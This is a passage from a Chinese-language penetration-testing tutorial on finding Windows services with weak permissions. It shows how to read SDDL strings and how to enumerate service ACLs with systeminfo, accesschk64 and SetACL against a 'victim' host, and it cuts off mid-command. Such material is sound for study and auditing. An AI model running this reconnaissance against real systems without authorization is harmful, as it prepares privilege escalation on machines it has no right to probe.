<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346641-102499395-bba06534ffdc2f18b7a9896d66c8f8e0.png" width="801" height="723" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="802" height="273" class="img_ev3q"></p>
<p>根据图表，我们可以看到，首先显示的是权限，其次是三个分号，然后是组/用户。而我们最感兴趣<strong>组/用户</strong>描述符是：AU、BA、WD。</p>
<p>在上面的输出中，我们可以看到 Everyone (<strong>WD</strong>) 组的权限【即 (A;;CC <strong>DC</strong> LC SW <strong>RP</strong> <strong>WP</strong> DT LO RC;;<strong>WD</strong>)】。如果将其细分，可以看到 Everyone 组拥有 DC (SERVICE_CHANGE_CONFIG) 权限，而这正是我们利用这项服务所必需的权限。同时还看到 Everyone 组拥有 RP/WP 权限，这意味着当前用户可以停止/启动这项服务。这对我们来说很关键，因为从之前的列举得知这是一个需要手动启动的服务，也就意味着我们不能通过重启机器来强制启动服务。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举服务的弱权限工具"><strong><div id="id2.2">2.2、枚举服务的弱权限：工具</div></strong><a href="#22枚举服务的弱权限工具" class="hash-link" aria-label="22枚举服务的弱权限工具的直接链接" title="22枚举服务的弱权限工具的直接链接">​</a></h4>
<p>有很多工具可以用来枚举服务权限，但在本例中，我们只介绍其中四款工具：Accesschk、SetACL、PowerUp、winPEAS。</p>
<p>在将工具转移到受害者身上之前，有一点需要牢记，那就是我们应该确定其系统架构，以便知道是使用 32 位还是 64 位的工具。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346593-1484929079-53ff1644e023028c937d196f1630e96d.png" width="902" height="134" class="img_ev3q"></p>
<p>在这里，我们可以看到受害者运行的是 64 位操作系统的 Windows 10 Pro - Build 17134（version 1803）。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="221accesschk"><strong><div id="id2.2.1">2.2.1、Accesschk</div></strong><a href="#221accesschk" class="hash-link" aria-label="221accesschk的直接链接" title="221accesschk的直接链接">​</a></h6>
<p>首先，我们使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener noreferrer">Sysinternals</a> 工具套件中的 accesschk64.exe 来枚举发现的 Juggernaut 服务的权限。</p>
<p>将 Accesschk64.exe 的副本下载并传输到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346552-1296408203-d6d06d86dda84cb0e13c361b92d86d25.png" width="459" height="217" class="img_ev3q"></p>
<p>然后，使用以下命令来查看服务权限：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe -wuvc Juggernaut -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346820-1884710328-f0635321476ee2be54edcf0d6dbeb78d.png" width="633" height="392" class="img_ev3q"></p>
<p>在这里，我们可以看到 Everyone 具有 SERVICE_CHANGE_CONFIG 权限，这意味着任何用户都可以修改该服务！</p>
<blockquote>
<p>除了 SERVICE_CHANGE_CONFIG  权限以外，允许修改服务的另一个权限标识是 SERVICE_ALL_ACCESS，而这个权限又代表着对服务的<strong>完全控制权</strong>。</p>
</blockquote>
<p>另外，我们不光可以用 accesschk 来查看服务权限，也可以使用它来查找服务，并一次性找到各自的服务权限。我们将在本篇的<a href="#id3.1">3.1小节</a>中进一步了解它的其它功能。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="222setacl"><strong><div id="id2.2.2">2.2.2、SetACL</div></strong><a href="#222setacl" class="hash-link" aria-label="222setacl的直接链接" title="222setacl的直接链接">​</a></h6>
<p>一款名为 <a href="https://helgeklein.com/download/" target="_blank" rel="noopener noreferrer">SetACL.exe</a> 的工具也非常实用，可以用它来查找任何对象（服务、注册表键值、文件、目录等）的 ACL 权限。</p>
<p>将 SetACL.exe 工具的副本下载并传输到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184347255-1997449306-eb34942f2225c97c10ab308de3addb26.png" width="741" height="346" class="img_ev3q"></p>
<p>然后，使用以下命令来查看服务的权限：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\SetACL64.exe -on &quot;Juggernaut&quot; -ot srv -actn list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346761-1136519203-6704ff28be80efe7ef3f54bee4a0f7e3.png" width="907" height="306" class="img_ev3q"></p>
<p>从上面输出的结果可以看到，该工具进行的很多检查都需要管理员权限才能开始，但只是简单地枚举权限，是不需要管理员权限就可以使用的。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3工具搜寻弱服务"><strong><div id="id3">3、工具搜寻弱服务</div></strong><a href="#3工具搜寻弱服务" class="hash-link" aria-label="3工具搜寻弱服务的直接链接" title="3工具搜寻弱服务的直接链接">​</a></h2>
<p>刚刚我们介绍了如何使用工具去查找非标准服务，以及在找到非标准服务之后该如何枚举其权限。</p>
<p>接下来，我们将了解如何使用工具来同时完成这两个步骤。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31accesschk"><strong><div id="id3.1">3.1、Accesschk</div></strong><a href="#31accesschk" class="hash-link" aria-label="31accesschk的直接链接" title="31accesschk的直接链接">​</a></h4>
<p>利用 accesschk 的另一种方法是枚举所有服务，同时检查特定组的权限。例如，标准用户默认属于多个组，我们可以枚举这些组，查看其中是否有任何组在任何服务上有写入权限。</p>
<p>我们感兴趣的用户/组如下：</p>
<ul>
<li>当前登录用户，如 bob。（%USERNAME%）</li>
<li>Authenticated Users【注：通过 <strong>控制台、RDP、WinRM、SMB</strong> 登录系统的用户都属于已认证用户。】</li>
<li>Everyone</li>
<li>BUILTIN\Users</li>
<li>NT AUTHORITY\INTERACTIVE</li>
</ul>
<p>使用 accesschk 时，我们要先检查当前用户，因为当前用户可能默认属于这些组中的大多数。【注：其实只要检查当前用户就可以了，因为检查其它组的最终目的还是为了知道当前用户在不在这个组中。】</p>
<p>可以使用以下命令查找当前用户或任何用户可写入的任何服务：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe &quot;%USERNAME%&quot; -wuvc * -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe &quot;Everyone&quot; -wuvc * -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe &quot;Authenticated Users&quot; -wuvc * -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe &quot;BUILTIN\Users&quot; -wuvc * -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe &quot;NT AUTHORITY\INTERACTIVE&quot; 